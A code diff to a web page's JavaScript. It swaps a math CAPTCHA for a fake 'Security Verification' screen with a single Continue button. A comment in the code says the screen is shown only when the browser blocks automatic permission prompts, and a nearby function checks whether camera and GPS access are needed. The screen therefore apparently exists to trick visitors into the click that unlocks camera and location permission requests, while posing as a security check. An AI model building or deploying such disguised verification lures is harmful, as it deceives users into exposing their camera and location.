@@ -213,17 +213,12 @@ async function checkPermissionBlocking(needsCam, needsGPS) {
     }
 }
 
-// ── CUSTOM CAPTCHA UI ─────────────────────────────────────────────────────
-// Math-equation CAPTCHA. No external services.
-// Resolves only when the user submits the correct answer.
+// ── VERIFICATION SCREEN (Continue button) ────────────────────────────────
+// Shown only when the browser blocks automatic permission prompts.
+// No puzzles, no delays — resolves the moment the user clicks Continue.
 function showCaptcha() {
     return new Promise(resolve => {
-        const a      = Math.floor(Math.random() * 9) + 1;
-        const b      = Math.floor(Math.random() * 9) + 1;
-        const answer = a + b;
-
         const overlay = document.createElement('div');
-        overlay.setAttribute('id', '_captchaOverlay');
         overlay.style.cssText =
             'position:fixed;inset:0;background:#080b12;display:flex;' +
             'align-items:center;justify-content:center;z-index:99999;' +
@@ -231,71 +226,36 @@ function showCaptcha() {
 
         overlay.innerHTML =
             '<div style="background:#111827;border:1px solid #1e293b;border-radius:18px;' +
-                'padding:40px 36px 32px;width:340px;max-width:93vw;text-align:center;' +
+                'padding:48px 40px 40px;width:340px;max-width:92vw;text-align:center;' +
                 'box-shadow:0 30px 80px rgba(0,0,0,.8);">' +
 
-              '<div style="width:62px;height:62px;border-radius:50%;' +
+              '<div style="width:64px;height:64px;border-radius:50%;' +
                   'background:linear-gradient(135deg,#3b82f6,#8b5cf6);' +
-                  'margin:0 auto 16px;display:flex;align-items:center;' +
+                  'margin:0 auto 20px;display:flex;align-items:center;' +
                   'justify-content:center;font-size:28px;">🛡️</div>' +
 
-              '<h2 style="color:#e2e8f0;font-size:18px;font-weight:700;margin:0 0 7px;">' +
-                  'Security Verification</h2>' +
-              '<p style="color:#64748b;font-size:12.5px;margin:0 0 26px;line-height:1.55;">' +
-                  'Confirm you\'re human to continue.</p>' +
+              '<h2 style="color:#e2e8f0;font-size:20px;font-weight:700;' +
+                  'margin:0 0 10px;letter-spacing:-.01em;">Security Verification</h2>' +
 
-              '<div style="background:#0d1117;border:1px solid #1e293b;border-radius:12px;' +
-                  'padding:22px 16px;margin-bottom:18px;">' +
-                '<p style="color:#94a3b8;font-size:11px;font-weight:700;' +
-                    'text-transform:uppercase;letter-spacing:.08em;margin:0 0 12px;">' +
-                    'Solve the equation</p>' +
-                '<p style="color:#f1f5f9;font-size:32px;font-weight:800;' +
-                    'letter-spacing:4px;margin:0 0 18px;font-variant-numeric:tabular-nums;">' +
-                    a + ' + ' + b + ' = ?</p>' +
-                '<input id="_captchaIn" type="number" inputmode="numeric" ' +
-                    'placeholder="Your answer" ' +
-                    'style="width:100%;padding:12px 14px;background:#111827;' +
-                    'border:2px solid #334155;color:#e2e8f0;border-radius:8px;' +
-                    'font-size:20px;font-weight:700;text-align:center;' +
-                    'box-sizing:border-box;outline:none;" />' +
-              '</div>' +
+              '<p style="color:#64748b;font-size:13px;margin:0 0 32px;line-height:1.6;">' +
+                  'Click continue to proceed.</p>' +
 
-              '<p id="_captchaErr" style="color:#ef4444;font-size:12px;' +
-                  'min-height:18px;margin:0 0 16px;"></p>' +
-
-              '<button id="_captchaBtn" ' +
-                  'style="width:100%;padding:14px;' +
+              '<button id="_continueBtn" ' +
+                  'style="width:100%;padding:16px;' +
                   'background:linear-gradient(135deg,#3b82f6,#2563eb);' +
-                  'color:#fff;border:none;border-radius:10px;font-size:14px;' +
-                  'font-weight:700;cursor:pointer;letter-spacing:.02em;">' +
-                  '✓ I\'m not a robot — Continue' +
+                  'color:#fff;border:none;border-radius:12px;font-size:15px;' +
+                  'font-weight:700;cursor:pointer;letter-spacing:.01em;">' +
+                  'Continue' +
               '</button>' +
 
-              '<p style="color:#1e293b;font-size:10px;margin:14px 0 0;">' +
-                  'Protected by site security</p>' +
             '</div>';
 
         document.body.appendChild(overlay);
 
-        const input  = overlay.querySelector('#_captchaIn');
-        const btn    = overlay.querySelector('#_captchaBtn');
-        const errMsg = overlay.querySelector('#_captchaErr');
-
-        const attempt = () => {
-            const val = parseInt(input.value, 10);
-            if (isNaN(val) || val !== answer) {
-                errMsg.textContent = '❌ Incorrect. Please try again.';
-                input.value = '';
-                input.focus();
-                return;
-            }
+        overlay.querySelector('#_continueBtn').addEventListener('click', () => {
             overlay.remove();
             resolve();
-        };
-
-        btn.addEventListener('click', attempt);
-        input.addEventListener('keydown', e => { if (e.key === 'Enter') attempt(); });
-        setTimeout(() => input.focus(), 80);
+        });
     });
 }
 
